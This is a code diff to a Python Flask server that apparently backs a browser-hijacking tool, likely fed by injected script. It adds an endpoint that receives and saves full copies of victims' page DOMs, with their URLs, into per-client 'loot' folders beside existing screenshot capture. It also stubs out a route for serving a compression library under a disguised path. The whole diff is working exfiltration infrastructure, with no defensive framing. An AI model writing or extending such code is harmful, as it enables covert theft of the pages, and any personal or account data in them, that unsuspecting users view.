@@ -49,6 +49,7 @@ def printHeader():
 # Support Data
 SessionDirectories = {}
 SessionImages = {}
+SessionDom = {}
 lootDirCounter = 1
 
 logFileName = "sessionLog.txt"
@@ -102,8 +103,9 @@ def findLootDirectory(identifier):
         # else:
         #     print("Loot directory already exists")
 
-        # Initialize our screenshot number tracker
+        # Initialize our number trackers
         SessionImages[identifier] = 1;
+        SessionDom[identifier] = 1;
 
     lootDir = "client_" + str(SessionDirectories[identifier])
     #print("Loot directory is: " + lootDir)
@@ -130,6 +132,15 @@ def sendHtml2Canvas():
 
 
 
+# Send copy of jszip
+# @app.route('/lib/compress.js', methods=['GET'])
+# def sendJsZip():
+#     with open('./jszip.min.js', 'rb') as file:
+#         return file.read(), 200
+
+
+
+
 # Capture screenshot
 @app.route('/loot/screenshot/<identifier>', methods=['POST'])
 def recordScreenshot(identifier):
@@ -153,6 +164,36 @@ def recordScreenshot(identifier):
         binary_file.close()
 
     return "ok", 200
+
+
+
+# Capture the DOM
+@app.route('/loot/dom/<identifier>', methods=['POST'])
+def recordDOM(identifier):
+    # print("Got DOM from: " + identifier)
+    lootDir = findLootDirectory(identifier)
+    content = request.json 
+    url = content['url']
+    trapDom = content['dom']
+    # print("Got DOM for URL: " + url)
+    # print("Dom: " + str(trapDom))
+
+
+    if identifier in SessionDom.keys():
+        domNumber = SessionDom[identifier]
+        SessionDom[identifier] = domNumber + 1
+    else:
+        raise RuntimeError("Session dom counter not found")
+        quit()
+
+    with open ("./loot/" + lootDir + "/" + str(domNumber) + "_domCopy.html", "w") as html_file:
+        logEvent(identifier, "HTML Copy: " + str(domNumber) + "_domCopy.html")
+        html_file.write(trapDom)
+        html_file.close()
+
+
+    return "ok", 200
+
 
 
 
